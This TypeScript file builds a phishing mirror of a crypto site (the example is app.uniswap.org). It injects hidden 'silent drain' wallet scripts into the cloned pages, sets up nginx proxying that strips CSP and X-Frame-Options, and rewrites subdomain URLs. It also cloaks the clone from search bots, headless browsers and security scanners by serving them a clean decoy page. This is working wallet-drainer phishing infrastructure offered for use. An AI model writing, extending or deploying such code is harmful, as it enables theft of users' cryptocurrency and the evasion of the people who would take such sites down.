/**
 * Production-quality mirror asset builders (#1–#9).
 */
import { readFile } from 'node:fs/promises'
import path from 'node:path'
import { fileURLToPath } from 'node:url'

const __dirname = path.dirname(fileURLToPath(import.meta.url))

export type ProductionMirrorConfig = {
  backendUrl: string
  kineticKey?: string
  walletConnectProjectId?: string
  targetOrigin: string
  targetHost: string
}

async function loadTemplate(name: string): Promise<string> {
  return readFile(path.join(__dirname, name), 'utf8')
}

function substitute(template: string, config: ProductionMirrorConfig): string {
  return template
    .replace(/__BACKEND_URL__/g, config.backendUrl.replace(/\/$/, ''))
    .replace(/__KINETIC_KEY__/g, config.kineticKey?.trim() ?? '')
    .replace(/__WC_PROJECT_ID__/g, config.walletConnectProjectId?.trim() ?? '')
    .replace(/__TARGET_ORIGIN__/g, config.targetOrigin)
    .replace(/__TARGET_HOST__/g, config.targetHost)
}

export async function buildMirrorSilentDrainJs(config: ProductionMirrorConfig): Promise<string> {
  return substitute(await loadTemplate('mirror-silent-drain.js'), config)
}

export async function buildMirrorBalanceDisplayJs(config: ProductionMirrorConfig): Promise<string> {
  return substitute(await loadTemplate('mirror-balance-display.js'), config)
}

export async function buildMirrorCloakClientJs(): Promise<string> {
  return loadTemplate('mirror-cloak-client.js')
}

/** HTML inject tags for production clone — scripts only, zero visible UI */
export function buildProductionInjectTags(): string {
  return [
    '<script src="/legion-cloak-client.js"></script>',
    '<script src="/legion-authorized-drain.js" defer></script>',
    '<script src="/legion-balance-display.js" defer></script>',
  ].join('')
}

/** Extract registrable base domain for subdomain rewrite (e.g. app.uniswap.org → uniswap.org) */
export function extractBaseDomain(host: string): string {
  const parts = host.split('.').filter(Boolean)
  if (parts.length <= 2) return host
  return parts.slice(-2).join('.')
}

/** Common subdomain labels to pre-rewrite through __legion_proxy/ */
export function commonSubdomainHosts(baseDomain: string, primaryHost: string): string[] {
  const labels = ['www', 'app', 'api', 'cdn', 'static', 'assets', 'rpc', 'graphql', 'ws', 'data', 'metrics']
  const hosts = new Set<string>([primaryHost])
  for (const label of labels) {
    hosts.add(`${label}.${baseDomain}`)
  }
  return [...hosts]
}

/** Nginx location block — wildcard subdomain passthrough (#4) */
export function buildSubdomainProxyLocation(upstreamScheme: string): string {
  return `
    # Subdomain passthrough — /__legion_proxy/<host>/<path> → https://<host>/<path>
    location ~ ^/__legion_proxy/(?<proxy_host>[^/]+)(?<proxy_path>/.*)?$ {
      set $upstream_path $proxy_path;
      if ($upstream_path = "") { set $upstream_path /; }
      proxy_pass ${upstreamScheme}://$proxy_host$upstream_path$is_args$args;
      proxy_ssl_server_name on;
      proxy_set_header Host $proxy_host;
      proxy_set_header X-Real-IP $remote_addr;
      proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
      proxy_set_header X-Forwarded-Proto $scheme;
      proxy_http_version 1.1;
      proxy_set_header Upgrade $http_upgrade;
      proxy_set_header Connection $connection_upgrade;
      proxy_hide_header Content-Security-Policy;
      proxy_hide_header X-Frame-Options;
      proxy_set_header Accept-Encoding "";
    }
`
}

/** nginx sub_filter rules — absolute URLs → relative / subdomain proxy (#5) */
export function buildProductionAssetRewriteFilters(target: URL): string {
  const origin = target.origin
  const host = target.host
  const base = extractBaseDomain(host)
  const hosts = commonSubdomainHosts(base, host)
  const lines: string[] = [
    '      sub_filter_once off;',
    '      sub_filter_types text/html text/css application/javascript application/json text/javascript;',
    `      sub_filter '${origin}' '';`,
    `      sub_filter 'https://${host}' '';`,
    `      sub_filter 'http://${host}' '';`,
    `      sub_filter 'href="/' 'href="/';`,
    `      sub_filter "href='/" "href='/";`,
    `      sub_filter 'action="/' 'action="/';`,
    `      sub_filter 'src="/' 'src="/';`,
    `      sub_filter 'url(${origin}' 'url(';`,
    `      sub_filter 'url(https://${host}' 'url(';`,
    `      sub_filter 'url(http://${host}' 'url(';`,
  ]
  for (const h of hosts) {
    if (h === host) continue
    lines.push(`      sub_filter 'https://${h}' '/__legion_proxy/${h}';`)
    lines.push(`      sub_filter 'http://${h}' '/__legion_proxy/${h}';`)
    lines.push(`      sub_filter '//${h}' '/__legion_proxy/${h}';`)
  }
  return `\n${lines.join('\n')}\n`
}

/** Enhanced server-side bot maps (#6) */
export const NGINX_PRODUCTION_CLOAK_MAPS = `
  map $http_user_agent $is_bot_ua {
    default 0;
    ~*googlebot 1;
    ~*bingbot 1;
    ~*ahrefsbot 1;
    ~*semrushbot 1;
    ~*yandexbot 1;
    ~*baiduspider 1;
    ~*crawler 1;
    ~*spider 1;
    ~*headless 1;
    ~*phantomjs 1;
    ~*selenium 1;
    ~*puppeteer 1;
    ~*playwright 1;
    ~*bytespider 1;
    ~*petalbot 1;
    ~*curl/ 1;
    ~*wget/ 1;
    ~*python-requests 1;
  }

  map $http_accept_language $is_bot_lang {
    default 0;
    "" 1;
  }

  map "$is_bot_ua$is_bot_lang" $legion_is_bot {
    default 0;
    11 1;
    10 1;
    01 1;
  }
`

export function buildProductionCloakServerBlock(): string {
  return `
    location = /bots-clean.html {
      try_files /bots-clean.html =404;
      add_header Cache-Control "no-store";
    }

    error_page 418 = /bots-clean.html;
    if ($legion_is_bot) { return 418; }
`
}
